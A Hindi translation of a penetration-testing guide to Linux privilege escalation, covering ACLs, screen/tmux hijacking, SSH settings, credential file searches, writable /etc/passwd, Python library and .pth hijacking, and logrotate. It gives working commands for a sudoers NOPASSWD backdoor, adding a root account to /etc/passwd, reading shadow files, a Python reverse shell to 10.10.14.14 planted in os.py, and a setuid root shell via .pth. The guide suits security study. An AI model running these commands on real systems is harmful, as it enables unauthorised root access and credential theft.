Access Control Lists (ACLs), discretionary permissions की दूसरी layer हैं, जो **पारंपरिक ugo/rwx permissions को override कर सकती हैं**। ये permissions उन विशिष्ट users को अधिकार देने या उनसे अधिकार रोकने की सुविधा देकर file या directory access पर नियंत्रण बढ़ाती हैं, जो उसके owner नहीं हैं या group का हिस्सा नहीं हैं। यह **granularity अधिक सटीक access management सुनिश्चित करती है**। अधिक जानकारी [**यहाँ**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकती है।<sup>[[19]](#references)</sup>

किसी file पर user "kali" को read और write permissions **दें**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**सिस्टम से विशिष्ट ACLs वाली फ़ाइलें प्राप्त करें:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-ins पर छिपा ACL backdoor

एक आम misconfiguration `/etc/sudoers.d/` में `440` mode वाली root-owned फ़ाइल है, जो फिर भी ACL के ज़रिए low-priv user को write access देती है।

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

यदि आपको `user:alice:rw-` जैसा कुछ दिखे, तो उपयोगकर्ता restrictive mode bits के बावजूद sudo rule जोड़ सकता है:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

यह high-impact ACL persistence/privesc path है, क्योंकि केवल `ls -l` के आधार पर की गई reviews में इसे आसानी से नज़रअंदाज़ किया जा सकता है।

## खुले shell sessions

Cross-user GNU Screen access केवल उसके version पर नहीं, बल्कि **चल रहे session के configuration और ACL** पर निर्भर करता है। [GNU Screen के दस्तावेज़](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) के अनुसार, इसे multiuser support के साथ build किया जाना चाहिए; `multiuser on` और `acladd` या उपयुक्त `aclchg` grant से किसी अन्य user को attach करने की अनुमति मिलती है। [Manual में cross-user session lookup के लिए setuid-root भी आवश्यक है](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)। केवल दिखाई देने वाला root-owned socket या SUID `screen` binary यह साबित नहीं करता कि root shell से attach किया जा सकता है। इसे privilege escalation मानने से पहले पुष्टि करें कि live session multiuser है, वर्तमान user के पास प्रभावी input/command permission है, और उस session में shell privileged owner के रूप में चलता है।

### screen sessions hijacking

**screen sessions की सूची बनाएँ**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Socket locations (कुछ सिस्टम इनमें से एक को दूसरे के symlink के रूप में दिखाते हैं): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**किसी session से जुड़ें**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

यह **पुराने tmux versions** में एक समस्या थी। मैं एक non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions की सूची देखें**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket के स्थान (कुछ systems में इनमें से एक, दूसरे का symlink होता है) - tmux sessions hijacking: tmux -S /tmp/dev sess ls उस socket का उपयोग करके सूची देखें; आप उस socket में tmux session शुरू कर सकते हैं...](<../../images/image (837).png>)

**सेशन से जुड़ें**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

**HTB के Valentine box** को एक उदाहरण के लिए देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

ऐतिहासिक रूप से असुरक्षित अवधि के दौरान प्रभावित Debian या उससे व्युत्पन्न OpenSSL builds से बनाई गई keys में अनुमानित randomness हो सकती है; होस्ट का मौजूदा distribution या patched OpenSSL version यह साबित नहीं करता कि कोई पुरानी key कैसे बनाई गई थी। **विशिष्ट key** को उपयुक्त ऐतिहासिक blacklist और उसकी provenance के आधार पर जाँचें। Debian का [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) public keys और `authorized_keys` की जाँच करने का तरीका बताता है, और [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) OpenSSL fix का रिकॉर्ड रखता है। किसी privileged account की `authorized_keys` में मौजूद entry escalation का संभावित संकेत तभी है, जब उससे मेल खाने वाली private key पुनः प्राप्त की जा सकती हो और प्रभावी SSH policy उस account के लिए उस key को अब भी स्वीकार करती हो; कमज़ोर **host** key अपने आप में login credential नहीं होती। compromised keys बदलें और उनसे जुड़ी पुरानी authorizations हटाएँ।

### SSH की महत्वपूर्ण configuration values

- **PasswordAuthentication:** बताता है कि password authentication की अनुमति है या नहीं। Upstream OpenSSH का default `yes` है; distribution configuration इसे override कर सकती है।
- **PubkeyAuthentication:** बताता है कि public key authentication की अनुमति है या नहीं। Default `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तब यह बताता है कि server खाली password strings वाले accounts में login की अनुमति देता है या नहीं। Default `no` है।

### Login control files

ये files तय करती हैं कि कौन login कर सकता है और कैसे:

- **`/etc/nologin`**: मौजूद होने पर, non-root logins को रोकती है और अपना message दिखाती है।
- **`/etc/securetty`**: यह सीमित करती है कि root कहाँ login कर सकता है (TTY allowlist)।
- **`/etc/motd`**: login के बाद दिखाया जाने वाला banner (इससे environment या maintenance की जानकारी leak हो सकती है)।

### PermitRootLogin

यह बताता है कि root ssh का उपयोग करके login कर सकता है या नहीं। Upstream OpenSSH का default `prohibit-password` है; distribution configuration इसे override कर सकती है। संभावित values:

- `yes`: root password और private key का उपयोग करके login कर सकता है
- `without-password` या `prohibit-password`: root केवल private key से login कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और commands options निर्दिष्ट होने पर login कर सकता है
- `no` : नहीं

### Trusted SSH user certificate authorities

`TrustedUserCAKeys` उन public keys के नाम बताता है जिन पर sshd **user** certificates पर हस्ताक्षर करने के लिए भरोसा करता है। यदि संबंधित private CA key कम privilege वाले user के लिए readable है, तो जाँचें कि certificate कौन प्राप्त कर सकता है और किन account principals के रूप में उससे authentication हो सकती है। `AuthorizedPrincipalsFile` या `AuthorizedPrincipalsCommand` स्वीकार किए जाने वाले names को सीमित कर सकते हैं; यदि इनमें से कोई भी configured न हो, तो certificate में target account का नाम होना चाहिए। `PermitRootLogin prohibit-password` root password authentication को रोकता है, लेकिन certificate authentication की अनुमति दे सकता है। केवल key path का उजागर होना access का प्रमाण नहीं है: public/private key pair, प्रभावी `Match` rules, account policy, key passphrase, revocation और स्वीकार किए जाने वाले signature algorithms की पुष्टि करें। Enumeration output में private-key bytes शामिल न करें। [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) देखें।

यदि privilege-delegation rule मौजूदा user को key के मालिक की identity के तहत बिना किसी प्रतिबंध के [certificate signer जैसे `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) चलाने देता है, तो private CA key को **पढ़े बिना भी** उपयोग किया जा सकता है। अनुमत exact command और arguments का मिलान signer account की key तक पहुँच, प्रभावी sshd configuration द्वारा trusted public CA, target account के लिए स्वीकार principal, certificate validity और उस account की login policy से करें। Delegated signer command या trusted CA file मात्र से दूसरे account तक access साबित नहीं होता; passive enumeration के दौरान test certificate पर हस्ताक्षर न करें।

अलग per-account CA trust path के लिए, [SSH certificate principal delimiter confusion](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion) देखें।

### AuthorizedKeysFile

यह उन files को निर्दिष्ट करता है जिनमें user authentication के लिए इस्तेमाल की जा सकने वाली public keys होती हैं। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से बदल दिया जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home directory से relative paths**। उदाहरण के लिए:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

यह कॉन्फ़िगरेशन बताता है कि अगर आप "**testusername**" यूज़र की **private** key से login करने की कोशिश करते हैं, तो ssh आपकी key की public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding से आप **keys को अपने server पर छोड़े बिना (बिना passphrases के!) अपनी local SSH keys का इस्तेमाल** कर सकते हैं। इसलिए, आप ssh के ज़रिए **एक host से connect** कर पाएँगे और वहाँ से **अपनी शुरुआती host पर मौजूद key का इस्तेमाल करके किसी दूसरे host से connect** कर पाएँगे।

आपको यह option `$HOME/.ssh.config` में इस तरह सेट करना होगा:

```
Host example.com
  ForwardAgent yes
```

ध्यान दें कि अगर `Host` हर बार `*` हो, जब भी user किसी दूसरी machine पर जाता है, तो वह host keys को access कर पाएगा (जो एक security issue है)।

फ़ाइल `/etc/ssh_config` इन **options** को **override** कर सकती है और इस configuration को allow या deny कर सकती है।\
फ़ाइल `/etc/sshd_config` keyword `AllowAgentForwarding` के ज़रिए ssh-agent forwarding को **allow** या **deny** कर सकती है (default allow है)।

अगर आपको पता चले कि किसी environment में Forward Agent configured है, तो यह पेज पढ़ें, क्योंकि **आप इसका abuse करके privileges escalate कर सकते हैं**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### Profile फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंदर की फ़ाइलें **ऐसी scripts हैं जो user के नया shell चलाने पर execute होती हैं**। इसलिए, अगर आप इनमें से किसी को **लिख या modify कर सकते हैं, तो आप privileges escalate कर सकते हैं**।

```bash
ls -l /etc/profile /etc/profile.d/
```

अगर कोई अजीब profile script मिले, तो उसमें **संवेदनशील जानकारी** है या नहीं, यह जाँचें।

### Passwd/Shadow फ़ाइलें

OS के अनुसार `/etc/passwd` और `/etc/shadow` फ़ाइलों का नाम अलग हो सकता है या उनका backup मौजूद हो सकता है। इसलिए **उन सभी को खोजने** और **यह जाँचने** की सलाह दी जाती है कि क्या आप उन्हें पढ़ सकते हैं, ताकि पता चल सके कि फ़ाइलों में **hashes** हैं या नहीं:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

कभी-कभी आपको `/etc/passwd` (या समकक्ष) फ़ाइल में **password hashes** मिल सकते हैं

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित में से किसी एक कमांड से पासवर्ड जनरेट करें।

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

फिर `hacker` उपयोगकर्ता जोड़ें और जनरेट किया गया पासवर्ड जोड़ें।

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

उदा.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `hacker:hacker` के साथ `su` कमांड का उपयोग कर सकते हैं।

वैकल्पिक रूप से, बिना पासवर्ड वाला dummy user जोड़ने के लिए आप नीचे दी गई पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: इससे मशीन की मौजूदा सुरक्षा कमज़ोर हो सकती है।

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

ध्यान दें: BSD platforms में `/etc/passwd` की जगह `/etc/pwd.db` और `/etc/master.passwd` होती है। साथ ही, `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया जाता है।

आपको जाँचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप **किसी service configuration file** में लिख सकते हैं?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file में बदलाव कर सकते हैं,** तो आप इन पंक्तियों में बदलाव कर सकते हैं:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

आपका backdoor अगली बार tomcat शुरू होने पर execute होगा।

### फ़ोल्डर जाँचें

इन फ़ोल्डरों में backups या दिलचस्प जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आख़िरी फ़ोल्डर को पढ़ नहीं पाएँगे, लेकिन कोशिश करें)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### असामान्य स्थान/स्वामित्व वाली फ़ाइलें

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### पिछले कुछ मिनटों में संशोधित फ़ाइलें

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB फ़ाइलें

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

पढ़ने योग्य application databases में usernames और password hashes के लिए table और column names की जाँच करें। Hash मिलना, उसका password recover करना और यह साबित करना कि वही password किसी local account के लिए भी इस्तेमाल होता है—ये अलग-अलग चरण हैं; सिर्फ़ 32-character की सामान्य hexadecimal string से MD5 या account access का अनुमान नहीं लगाया जा सकता।

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

यदि पढ़ने योग्य shell history में `sudo` command के बाद password जैसी दिखने वाली कोई छोटी line हो, तो उसके आसपास की lines को मैन्युअल रूप से देखें। सामान्य `sudo` prompt पर दर्ज किया गया password shell history में सेव नहीं होता; उसके बाद वाली line केवल गलती से shell में दर्ज किया गया input हो सकती है, मान्य password का प्रमाण नहीं। `.sudo_as_admin_successful` marker पहले हुए उपयोग को रिकॉर्ड करता है, मौजूदा authorization को नहीं।

### छिपी हुई फ़ाइलें

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH में Script/Binaries**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **वेब फ़ाइलें**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **बैकअप**

बैकअप डायरेक्टरी के अंदर मौजूद पढ़ी जा सकने वाली फ़ाइलों के साथ-साथ उन फ़ाइलों की भी जाँच करें जिनके **नामों** में `backup` हो: अस्पष्ट नाम वाले या एन्क्रिप्टेड एक्सटेंशन वाले आर्काइव में भी पुराने एप्लिकेशन डेटा का खुलासा हो सकता है। एन्क्रिप्टेड आर्काइव केवल संभावित exposure है। पासवर्ड रिकवरी, उसकी सामग्री की जाँच, एप्लिकेशन hash की रिकवरी, और उस पासवर्ड का Unix खाते के लिए दोबारा इस्तेमाल—इनकी अलग-अलग पुष्टि करनी होती है; आर्काइव में मौजूद hash से यह साबित नहीं होता कि उससे लोकल लॉगिन किया जा सकता है।

पढ़े जा सकने वाले वर्चुअल-मशीन बैकअप की भी इसी तरह जाँच करें। VirtualBox की `.vbox` कॉन्फ़िगरेशन, अटैच की गई `.vdi` इमेज की पहचान कर सकती है और उसमें एन्क्रिप्टेड डिस्क-की का मेटाडेटा हो सकता है; [VirtualBox दस्तावेज़ के अनुसार एन्क्रिप्टेड डेटा की VM कॉन्फ़िगरेशन में स्टोर होती है](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)। ऑफ़लाइन डिस्क की जाँच तभी संभव है, जब कॉन्फ़िगरेशन और इमेज—दोनों तक पहुँच हो। गेस्ट वॉल्यूम में अपनी [LUKS encryption layer](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) हो सकती है, जिसके लिए अलग की की ज़रूरत होगी। अधिकृत रूप से डिक्रिप्ट करने के बाद भी, पुरानी स्क्रिप्ट या कॉन्फ़िगरेशन में पासवर्ड हो सकता है; इसे लोकल privilege escalation कहने से पहले पुष्टि करें कि क्रेडेंशियल किसी होस्ट खाते के लिए अभी भी मान्य है और उसकी प्रभावी `sudo` नीति से कोई privileged command चलाया जा सकता है। पैसिव enumeration के दौरान इमेज को कॉपी, डिक्रिप्ट या माउंट किए बिना पाथ और अनुमतियों की सूची बनाएँ।

पढ़े जा सकने वाले आर्काइव की जाँच करते समय, कुछ भी extract करने से पहले उसके सदस्य फ़ाइलों के नामों की सूची देखें: छिपी हुई authenticator फ़ाइलें, recovery-code सामग्री या SSH keys मौजूद हो सकती हैं, भले ही उनकी लाइव कॉपी सुरक्षित हो। फ़ाइल के नाम केवल एक सुराग देते हैं; सामग्री और किसी भी खाते में उसके दोबारा इस्तेमाल की अलग से पुष्टि करें।

बैकअप डायरेक्टरी में **किसी दूसरे यूज़र के स्वामित्व वाले पढ़े जा सकने वाले आर्काइव** को प्राथमिकता दें—खासकर root के स्वामित्व वाले और group membership के ज़रिए उपलब्ध आर्काइव को। पुराने आर्काइव में कोई कॉन्फ़िगरेशन या authentication secret हो सकता है, भले ही उसकी लाइव कॉपी सुरक्षित हो। [Backrest](https://garethgeorge.github.io/backrest/) जैसे लोकल बैकअप UI के लिए, सेवा का प्रभावी खाता जाँचें और पता लगाएँ कि क्या कम-विशेषाधिकार वाला यूज़र उसकी कॉन्फ़िगरेशन पढ़ सकता है या UI में authenticate कर सकता है। इसके [hooks](https://garethgeorge.github.io/backrest/docs/hooks) और [restic command interface](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto), daemon की फ़ाइल और कमांड अनुमतियों के साथ काम कर सकते हैं; केवल loopback listener से प्रभाव का पता नहीं चलता। Backrest का `passwordBcrypt`, इसके [authentication code](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) में base64-encoded bcrypt hash है, plaintext पासवर्ड नहीं। किसी उजागर आर्काइव या UI को privilege boundary मानने से पहले, सेवा की पहचान, उपयोग योग्य क्रेडेंशियल और संबंधित plan या repository तक पहुँच की पुष्टि करें।

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### पासवर्ड वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का code पढ़ें। यह **ऐसी कई संभावित फ़ाइलें खोजता है जिनमें पासवर्ड हो सकते हैं**।\
एक **और दिलचस्प tool** जिसका आप इसके लिए इस्तेमाल कर सकते हैं, वह है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)। यह एक open source application है, जिसका उपयोग Windows, Linux और Mac पर स्थानीय computer में संग्रहित कई पासवर्ड प्राप्त करने के लिए किया जाता है।

यदि `/etc/guacamole/guacamole.properties` पढ़ी जा सकती है, तो उसकी `mysql-*`, `postgresql-*` या `sqlserver-*` database connection settings की समीक्षा करें। यदि account को Guacamole JDBC tables पढ़ने की अनुमति है, तो `guacamole_connection_parameter` में संग्रहित SSH `username`, `password`, `private-key` या `passphrase` मान हो सकते हैं। Connection IDs और parameter names से शुरुआत करें, फिर केवल संबंधित rows देखें; संग्रहित मान कोई dynamic token या vault reference हो सकता है, न कि दोबारा इस्तेमाल किया जा सकने वाला secret। [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) और [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) देखें।

[pswm password manager](https://github.com/Julynx/pswm#usage) डिफ़ॉल्ट रूप से `~/.local/share/pswm/pswm` में एक encrypted vault संग्रहित करता है। यदि किसी दूसरे user का vault दिखाई दे, तो उसका ownership जाँचें और देखें कि क्या आपका account वास्तव में उसे पढ़ सकता है। केवल vault path से credentials का पता नहीं चलता; उसका master password recover करना, दोबारा इस्तेमाल किया जा सकने वाला account password ढूँढ़ना और उस account के privileges की पुष्टि करना अलग-अलग चरण हैं।

[Passpie का डिफ़ॉल्ट database](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) `~/.passpie/` है। इसमें `.keys` keyring और group directories के भीतर encrypted `.pass` credential files होती हैं। दिखाई देने वाली database directory केवल एक path lead है: key और संबंधित encrypted entry तक पहुँच, आवश्यक master passphrase, और यह कि recovered credential किसी अधिक privileged account का है या नहीं—इन सबकी पुष्टि करें। Passpie [custom database paths](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) भी support करता है, इसलिए डिफ़ॉल्ट path में सभी संभावनाएँ शामिल नहीं होतीं। Automated enumeration में credentials export करने या key material print करने के बजाय metadata की सूची बनानी चाहिए।

### लॉग

यदि आप लॉग पढ़ सकते हैं, तो उनमें **दिलचस्प/गोपनीय जानकारी** मिल सकती है। लॉग जितना अजीब होगा, उतना ही दिलचस्प होगा (शायद)।\
इसके अलावा, कुछ गलत तरीके से configured ("backdoored"?) **audit logs** में **पासवर्ड रिकॉर्ड** किए जा सकते हैं, जैसा कि इस post में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

लॉग पढ़ने के लिए **समूह** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) वास्तव में मददगार होगा।

### Shell फ़ाइलें

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generic Creds Search/Regex

आपको उन files को भी खोजना चाहिए जिनके **name** या **content** में "**password**" शब्द हो, और logs में IPs और emails या hashes regexps भी जाँचने चाहिए।\
मैं यहाँ यह सब करने का तरीका नहीं बताऊँगा, लेकिन अगर आप इसमें रुचि रखते हैं, तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए जाने वाले आखिरी checks देख सकते हैं।

## Writable files

### Python library hijacking

अगर आपको पता है कि python script **कहाँ** execute होने वाली है और आप उस folder के अंदर **लिख सकते हैं** या python libraries को **modify कर सकते हैं**, तो आप OS library को modify करके उसमें backdoor डाल सकते हैं (अगर आप उस जगह लिख सकते हैं जहाँ python script execute होने वाली है, तो os.py library को copy और paste करें)।

**Library में backdoor डालने** के लिए, os.py library के अंत में बस यह line जोड़ें (IP और PORT बदलें):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` द्वारा प्रोसेस की गई writable `.pth` फ़ाइल

`site.addsitedir(DIR)` को `sys.path.append(DIR)` के समान न समझें। यह `DIR` में मौजूद हर `*.pth` फ़ाइल को भी प्रोसेस करता है। `import` से शुरू होने वाली और उसके बाद space या tab वाली पंक्ति Python code के रूप में execute होती है। इसके बजाय, path वाली पंक्तियों को site directory के सापेक्ष resolve किया जाता है और केवल तभी जोड़ा जाता है, जब वे मौजूद हों।<sup>[[38]](#references)</sup>

यह privilege escalation का कारण बनता है, जब sudo-allowed या अन्यथा privileged Python program, मौजूदा user या उसके किसी group द्वारा writable directory पर `site.addsitedir()` call करता है। `.pth` code, privileged program द्वारा अपना import path सेट करते समय, उसकी सामान्य कार्रवाई dispatch होने से पहले execute होता है।<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Executable `.pth` सामग्री एक ही लाइन में होनी चाहिए, लेकिन semicolon से कई statements लिखे जा सकते हैं। उदाहरण के लिए, root execution path से Bash की setuid copy बनाई जा सकती है; Bash को `-p` के साथ invoke करें, ताकि वह अपनी effective ID बनाए रखे।<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` विकल्प केवल Python के automatic `site` initialization को disable करता है। यह ऐसे program को सुरक्षित नहीं करता जो स्पष्ट रूप से `site` import करे और `site.addsitedir()` call करे। Privileged import paths से attacker-writable directories हटाएँ और सुनिश्चित करें कि directory तथा उसकी `.pth` files का ownership केवल privileged administrator के पास हो और उन्हें केवल वही लिख सके।<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate exploitation

एक privileged `logrotate` job, उस समय cross-user file-write path बना सकता है जब वह वास्तव में ऐसी directory के नीचे किसी log को rotate करे जिसे lower-privileged user rotation के दौरान replace या redirect कर सकता हो। केवल writable log मिलना एक सुराग है। उस सटीक active rule और उसके `create`, `olddir`, तथा `su` directives की पुष्टि करें; scheduler की effective identity; log की parent directory पर write और search अधिकार; और क्या installed build तथा policy destination बदलने की अनुमति देते हैं। Startup-file write से command execution होने के लिए बाद में चलने वाले privileged shell को उस file को load भी करना होगा। Rotation trigger किए बिना या race की कोशिश किए बिना schedule, rule, version/packaging और path metadata की जाँच करें।

> [!TIP]
> `3.18.0` या किसी भी version string को अकेले exploitability की सीमा न मानें। [Upstream's change log](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) में कई releases में directory और symlink hardening दर्ज है, और distributions fixes को backport कर सकती हैं। [Upstream manual](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) की सलाह है कि जब root, non-privileged users द्वारा नियंत्रित directories में logs rotate करे, तो `su` का उपयोग करें; effective rule और वास्तविक behavior की पुष्टि करें।

इस vulnerability के बारे में अधिक विस्तृत जानकारी इस page पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)।<sup>[[37]](#references)</sup>

आप इस vulnerability का exploitation [**logrotten**](https://github.com/whotwagner/logrotten) से कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** से बहुत मिलती-जुलती है। इसलिए, जब भी आपको logs बदलने की संभावना मिले, जाँचें कि उन logs को कौन manage कर रहा है और क्या logs को symlinks से बदलकर privileges escalate किए जा सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)।<sup>[[20]](#references)</sup>

